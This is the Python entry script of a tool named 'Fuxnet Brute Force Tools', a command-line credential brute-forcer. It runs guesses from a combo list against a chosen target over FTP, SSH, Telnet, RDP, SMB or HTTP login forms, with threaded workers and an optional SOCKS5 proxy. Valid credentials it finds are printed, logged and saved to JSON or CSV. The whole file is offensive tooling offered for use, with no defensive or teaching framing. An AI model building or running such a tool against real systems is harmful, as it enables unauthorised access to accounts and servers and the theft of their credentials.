"""
Author: FAZ-28
Copyright 2025 | Fuxnet Brute Force Tools
"""

import argparse
import logging
import os
import json
import csv
from modul.BruteForceFTP import BruteForceFTP
from modul.BruteForceSSH import BruteForceSSH
from modul.BruteForceTalent import BruteForceTalent
from modul.BruteForceRDP import BruteForceRDP
from modul.BruteForceSMB import BruteForceSMB
from modul.BruteForceHTTP import BruteForceHTTP
from modul.Socks5Proxy import run_socks5_proxy

def load_combos(path):
    with open(path, 'r') as f:
        return [tuple(line.strip().split(':', 1)) for line in f if ':' in line and not line.strip().startswith('==')]

def save_result_json(data, output_prefix):
    with open(f"{output_prefix}.json", 'w') as jf:
        json.dump({"username": data[0], "password": data[1]}, jf, indent=4)

def save_result_csv(data, output_prefix):
    with open(f"{output_prefix}.csv", 'w', newline='') as cf:
        writer = csv.writer(cf)
        writer.writerow(["username", "password"])
        writer.writerow([data[0], data[1]])

def main():
    parser = argparse.ArgumentParser(description="Multi-protocol brute force tool")
    parser.add_argument("protocol", choices=["ftp", "ssh", "talent", "rdp", "smb", "http"], help="Protocol to use")
    parser.add_argument("--target", required=True, help="Target IP or hostname")
    parser.add_argument("--port", type=int, help="Target port")
    parser.add_argument("--combos", required=True, help="Path to combo list (user:pass)")
    parser.add_argument("--http-url", help="Login form URL for HTTP")
    parser.add_argument("--http-user-field", default="username")
    parser.add_argument("--http-pass-field", default="password")
    parser.add_argument("--http-success-key", help="Keyword indicating login success")
    parser.add_argument("--max-workers", type=int, default=10)
    parser.add_argument("--max-errors", type=int, default=10)
    parser.add_argument("--output", default="output")
    parser.add_argument("--save", action="store_true", help="Save results to file (JSON/CSV)")
    parser.add_argument("--output-format", choices=["json", "csv", "both", "console"], default="console",
                        help="Format to save output (default: console only)")
    parser.add_argument("--logfile", default="brute.log")
    parser.add_argument("--use-proxy", action="store_true", help="Enable SOCKS5 proxy server")
    parser.add_argument("--proxy-port", type=int, default=1080, help="SOCKS5 proxy port (default: 1080)")

    args = parser.parse_args()

    logging.basicConfig(
        filename=args.logfile,
        filemode='a',
        format='[%(asctime)s] %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S',
        level=logging.INFO
    )

    if args.use_proxy:
        run_socks5_proxy(args.target, args.proxy_port)
        print(f"[+] SOCKS5 proxy is running on [{args.target}]:{args.proxy_port}")

    combos = load_combos(args.combos)
    port = args.port

    if args.protocol == "ftp":
        module = BruteForceFTP(args.target, port or 21, combos, args.max_workers, args.max_errors)
    elif args.protocol == "ssh":
        module = BruteForceSSH(args.target, port or 22, combos, args.max_workers, args.max_errors)
    elif args.protocol == "talent":
        module = BruteForceTalent(args.target, port or 23, combos, args.max_workers, args.max_errors)
    elif args.protocol == "rdp":
        module = BruteForceRDP(args.target, port or 3389, combos, args.max_workers, args.max_errors)
    elif args.protocol == "smb":
        module = BruteForceSMB(args.target, port or 445, combos, args.max_workers, args.max_errors)
    elif args.protocol == "http":
        if not all([args.http_url, args.http_success_key]):
            print("[!] For HTTP, provide --http-url and --http-success-key")
            return
        module = BruteForceHTTP(
            args.http_url,
            combos,
            args.http_user_field,
            args.http_pass_field,
            args.http_success_key,
            args.max_workers,
            args.max_errors,
        )

    result = module.run()
    if result:
        message = f"[+] Valid credential found: {result[0]}:{result[1]}"
        print(message)
        logging.info(message)

        if args.save:
            if args.output_format == "json":
                save_result_json(result, args.output)
            elif args.output_format == "csv":
                save_result_csv(result, args.output)
            elif args.output_format == "both":
                save_result_json(result, args.output)
                save_result_csv(result, args.output)
    else:
        print("[-] No valid credentials found.")
        logging.info("No valid credentials found.")

if __name__ == "__main__":
    main()